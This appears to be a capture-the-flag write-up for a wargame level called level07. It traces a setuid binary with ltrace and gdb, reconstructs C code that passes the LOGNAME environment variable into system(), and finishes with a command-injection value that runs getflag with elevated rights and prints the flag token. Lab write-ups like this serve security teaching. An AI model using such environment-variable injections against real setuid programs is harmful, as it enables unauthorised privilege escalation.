# Level07
## substitution commands linux
Command substitution allows the output of a command to replace the command itself. Command substitution occurs when a command is enclosed as follows: $(command) or \`command\`
Example:
```bash
echo `pwd`
/home/user/level07
```

```bash
ls -la
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07 # with suid, sgid permissions
```
We can debug this binary file using one of those: gdb, objdump or ltrace,
```bash
ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                             = 2007
geteuid()                                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
getenv("LOGNAME")                                                     = "level07"
asprintf(0xbffff6f4, 0x8048688, 0xbfffff26, 0xb7e5ee55, 0xb7fed280)   = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                = 0
+++ exited (status 0) +++
```

```bash
# Using Gfb
Dump of assembler code for function main:
   0x08048514 <+0>:	push   ebp
   0x08048515 <+1>:	mov    ebp,esp
   0x08048517 <+3>:	and    esp,0xfffffff0
   0x0804851a <+6>:	sub    esp,0x20
   0x0804851d <+9>:	call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:	mov    DWORD PTR [esp+0x18],eax
   0x08048526 <+18>:	call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804852f <+27>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048533 <+31>:	mov    DWORD PTR [esp+0x8],eax
   0x08048537 <+35>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804853b <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x0804853f <+43>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048543 <+47>:	mov    DWORD PTR [esp],eax
   0x08048546 <+50>:	call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804854f <+59>:	mov    DWORD PTR [esp+0x8],eax
   0x08048553 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048557 <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x0804855b <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804855f <+75>:	mov    DWORD PTR [esp],eax
   0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:	mov    DWORD PTR [esp+0x14],0x0
   0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
   0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>:	lea    eax,[esp+0x14]
   0x0804858b <+119>:	mov    DWORD PTR [esp],eax
   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048597 <+131>:	mov    DWORD PTR [esp],eax
   0x0804859a <+134>:	call   0x8048410 <system@plt>
   0x0804859f <+139>:	leave
   0x080485a0 <+140>:	ret
```
Translate to this code source
```c
int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  char *buff;

  asprintf(&buff, "/bin/echo %s", getenv("LOGNAME"));
  system(buff);
}
```
The program read an env variable which is `LOGNAME`, which we can override to use our command
```bash
LOGNAME='`getflag`'
# output: Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```